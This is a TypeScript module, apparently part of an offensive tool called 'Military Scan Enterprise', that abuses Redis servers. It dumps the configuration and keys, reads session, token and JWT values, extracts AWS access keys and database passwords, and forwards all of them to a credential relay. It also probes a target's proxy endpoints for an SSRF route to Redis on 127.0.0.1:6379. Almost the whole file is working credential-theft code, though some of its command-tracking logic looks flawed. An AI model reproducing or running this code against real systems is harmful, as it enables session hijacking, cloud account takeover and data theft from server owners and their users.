import net from 'net';
import { relayIngest } from '../credentialRelay';
import { writeDumpFile } from '../admin';

export interface RedisDump {
  keys: string[];
  config: Record<string, string>;
  databases: number[];
  sessionTokens: Array<{ key: string; value: string; timestamp: string }>;
  keysFound: number;
  sessionsCaptured: number;
  configExtracted: number;
  info?: Record<string, string>;
  dumpFile?: string;
}

// Parser RESP completo
class RedisParser {
  private buffer: string = '';
  private responses: any[] = [];

  feed(data: string): any[] {
    this.buffer += data;
    const responses: any[] = [];

    while (this.buffer.length > 0) {
      const [parsed, remaining] = this.parseNext(this.buffer);
      if (!parsed) break; // Precisa de mais dados

      responses.push(parsed);
      this.buffer = remaining;
    }

    return responses;
  }

  private parseNext(buffer: string): [any, string] | [null, string] {
    if (buffer.length === 0) return [null, buffer];

    const type = buffer[0];

    switch (type) {
      case '+': // Simple String
        const endSimple = buffer.indexOf('\r\n');
        if (endSimple === -1) return [null, buffer];
        return [buffer.substring(1, endSimple), buffer.substring(endSimple + 2)];

      case '-': // Error
        const endError = buffer.indexOf('\r\n');
        if (endError === -1) return [null, buffer];
        return [{ error: buffer.substring(1, endError) }, buffer.substring(endError + 2)];

      case ':': // Integer
        const endInt = buffer.indexOf('\r\n');
        if (endInt === -1) return [null, buffer];
        return [parseInt(buffer.substring(1, endInt), 10), buffer.substring(endInt + 2)];

      case '$': // Bulk String
        const endLength = buffer.indexOf('\r\n');
        if (endLength === -1) return [null, buffer];

        const length = parseInt(buffer.substring(1, endLength), 10);
        if (length === -1) return [null, buffer.substring(endLength + 2)]; // Null bulk

        const totalLen = endLength + 2 + length + 2;
        if (buffer.length < totalLen) return [null, buffer];

        const bulkData = buffer.substring(endLength + 2, endLength + 2 + length);
        return [bulkData, buffer.substring(totalLen)];

      case '*': // Array
        const endArrayLen = buffer.indexOf('\r\n');
        if (endArrayLen === -1) return [null, buffer];

        const arrayLen = parseInt(buffer.substring(1, endArrayLen), 10);
        let remaining = buffer.substring(endArrayLen + 2);
        const array = [];

        for (let i = 0; i < arrayLen; i++) {
          const [element, newRemaining] = this.parseNext(remaining);
          if (element === null) return [null, buffer]; // Need more data
          array.push(element);
          remaining = newRemaining;
        }

        return [array, remaining];

      default:
        // Tratar como inline command (simples)
        const endLine = buffer.indexOf('\r\n');
        if (endLine === -1) return [null, buffer];
        return [buffer.substring(0, endLine), buffer.substring(endLine + 2)];
    }
  }
}

export async function executeRedisAbuse(target: string, password: string): Promise<RedisDump> {
  return new Promise((resolve, reject) => {
    const client = new net.Socket();
    const parser = new RedisParser();
    const results: RedisDump = {
      keys: [],
      config: {},
      databases: [],
      sessionTokens: [],
      keysFound: 0,
      sessionsCaptured: 0,
      configExtracted: 0,
      info: {}
    };

    let authenticated = false;
    let pendingCommands: string[] = [];
    let currentCommand: string | null = null;
    let timeout: NodeJS.Timeout;

    const cleanup = () => {
      if (timeout) clearTimeout(timeout);
      client.removeAllListeners();
      client.destroy();
    };

    timeout = setTimeout(() => {
      cleanup();
      reject(new Error('Redis timeout'));
    }, 15000);

    const sendCommand = (cmd: string) => {
      if (!authenticated && !cmd.startsWith('AUTH')) {
        pendingCommands.push(cmd);
        return;
      }
      client.write(cmd + '\r\n');
    };

    const tryConnectDirect = () => {
      client.connect(6379, 'localhost', () => {
        if (password) {
          sendCommand(`AUTH ${password}`);
        } else {
          authenticated = true;
          // Enviar comandos iniciais
          sendCommand('INFO server');
          sendCommand('CONFIG GET *');
          sendCommand('DBSIZE');
          sendCommand('KEYS *');
          sendCommand('CLIENT LIST');
          sendCommand('SLOWLOG GET 100');
        }
      });
    };

    // SSRF auto-scan: tenta achar um endpoint proxy no target antes de abrir TCP
    const trySSRF = async () => {
      try {
        const ssrf = await findSSRFChannel(target);
        if (!ssrf) return false;
        // Apenas registra descoberta (implantar túnel gopher completo exigiria mais integração)
        relayIngest([{
          key: "SSRF_CHANNEL",
          value: `${target}${ssrf}`,
          type: "SSRF_TUNNEL",
          source: "redis_abuse",
          target,
          capturedAt: new Date().toISOString()
        }]);
        return false; // fallback para TCP por enquanto
      } catch {
        return false;
      }
    };

    trySSRF().then((used) => {
      if (!used) {
        tryConnectDirect();
      }
    });

    client.on('data', (data) => {
      const responses = parser.feed(data.toString());

      for (const response of responses) {
        // Verificar resposta de autenticação
        if (!authenticated && currentCommand?.startsWith('AUTH')) {
          if (response === 'OK') {
            authenticated = true;
            // Enviar comandos pendentes
            for (const cmd of pendingCommands) {
              sendCommand(cmd);
            }
            pendingCommands = [];
          } else if (response.error) {
            cleanup();
            reject(new Error(`Redis auth failed: ${response.error}`));
            return;
          }
          currentCommand = null;
          continue;
        }

        // Processar respostas baseado no último comando
        if (currentCommand === 'INFO server') {
          const lines = response.split('\r\n');
          for (const line of lines) {
            if (line.includes(':')) {
              const [key, value] = line.split(':');
              results.info![key] = value;
            }
          }
        }

        else if (currentCommand === 'CONFIG GET *') {
          if (Array.isArray(response)) {
            for (let i = 0; i < response.length; i += 2) {
              results.config[response[i]] = response[i + 1];
              results.configExtracted++;
            }

            // Procurar senhas de DB
            if (results.config.requirepass) {
              attemptDbPivot(target, results.config.requirepass);
            }
          }
        }

        else if (currentCommand === 'DBSIZE') {
          if (typeof response === 'number') {
            results.databases.push(response);
          }
        }

        else if (currentCommand === 'KEYS *') {
          if (Array.isArray(response)) {
            results.keys = response;
            results.keysFound = response.length;

            // Buscar valores das chaves de sessão
            const sessionKeys = response.filter((k: string) => 
              k.includes('sess') || k.includes('token') || k.includes('auth') || k.includes('jwt')
            );

            for (const key of sessionKeys) {
              sendCommand(`GET ${key}`);
            }
          }
        }

        else if (currentCommand?.startsWith('GET ')) {
          const key = currentCommand.substring(4);
          if (response && typeof response === 'string') {
            results.sessionTokens.push({
              key,
              value: response,
              timestamp: new Date().toISOString()
            });
            results.sessionsCaptured++;

            // Injeta no relay imediatamente
            relayIngest([{
              key,
              value: response,
              type: 'REDIS_SESSION',
              source: 'redis_abuse',
              target,
              capturedAt: new Date().toISOString()
            }]);

            // Procurar AWS keys
            const awsMatch = response.match(/AKIA[0-9A-Z]{16}/);
            if (awsMatch) {
              relayIngest([{
                key: 'AWS_ACCESS_KEY',
                value: awsMatch[0],
                type: 'CLOUD_CREDENTIAL',
                source: 'redis_abuse',
                target,
                capturedAt: new Date().toISOString()
              }]);
            }
          }
        }

        else if (currentCommand === 'CLIENT LIST') {
          // Processar lista de clientes se necessário
        }

        else if (currentCommand === 'SLOWLOG GET 100') {
          // Processar slowlog se necessário
        }

        // Próximo comando
        currentCommand = null;

        // Se ainda há comandos pendentes, enviar próximo
        if (pendingCommands.length > 0) {
          const nextCmd = pendingCommands.shift();
          currentCommand = nextCmd!;
          client.write(nextCmd + '\r\n');
        }
      }
    });

    client.on('close', () => {
      cleanup();
      resolve(results);
    });

    client.on('error', (err) => {
      cleanup();
      reject(err);
    });
  });
}

function attemptDbPivot(target: string, password: string) {
  // Implementar pivot para PostgreSQL/MySQL
  console.log(`[PIVOT] DB password found: ${password}`);

  relayIngest([{
    key: 'DATABASE_PASSWORD',
    value: password,
    type: 'DB_CREDENTIAL',
    source: 'redis_pivot',
    target,
    capturedAt: new Date().toISOString()
  }]);
}

async function findSSRFChannel(target: string): Promise<string | null> {
  const candidates = [
    "/api/proxy",
    "/api/fetch",
    "/api/image",
    "/api/import",
    "/api/webhook",
  ];
  for (const path of candidates) {
    try {
      const probe = await fetch(`${target}${path}?url=http://127.0.0.1:6379`);
      if (probe.status < 500) {
        return path;
      }
    } catch {
      continue;
    }
  }
  return null;
}

export function extractAwsFromRedis(redisResult: RedisDump): { accessKey: string; secretKey: string } | null {
  for (const token of redisResult.sessionTokens) {
    // Procurar padrão AWS_KEY=AKIA... e SECRET_KEY=
    const accessMatch = token.value.match(/AKIA[0-9A-Z]{16}/);
    if (accessMatch) {
      // Procurar secret próximo
      const secretMatch = token.value.match(/[A-Za-z0-9+/]{40,}|wJalrXUtnFEMI\/K7MDENG\/[a-zA-Z0-9+/]+/);
      if (secretMatch) {
        return {
          accessKey: accessMatch[0],
          secretKey: secretMatch[0]
        };
      }
      return {
        accessKey: accessMatch[0],
        secretKey: token.value // fallback
      };
    }
  }
  return null;
}

export function writeRedisDump(results: RedisDump, target: string): string {
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `Redis-Dump-${ts}.json`;
  const content = JSON.stringify({
    _header: {
      tool: 'Military Scan Enterprise',
      module: 'RedisAbuseEngine',
      type: 'REDIS_AUTO_DUMP',
      target,
      timestamp: new Date().toISOString(),
      keysFound: results.keysFound,
      sessionsCaptured: results.sessionsCaptured,
      configExtracted: results.configExtracted,
      databases: results.databases.length
    },
    info: results.info,
    config: results.config,
    keys: results.keys,
    sessionTokens: results.sessionTokens.map(t => ({
      ...t,
      value: t.value.length > 100 ? t.value.substring(0, 100) + '...' : t.value
    }))
  }, null, 2);

  writeDumpFile(filename, content);
  return filename;
}
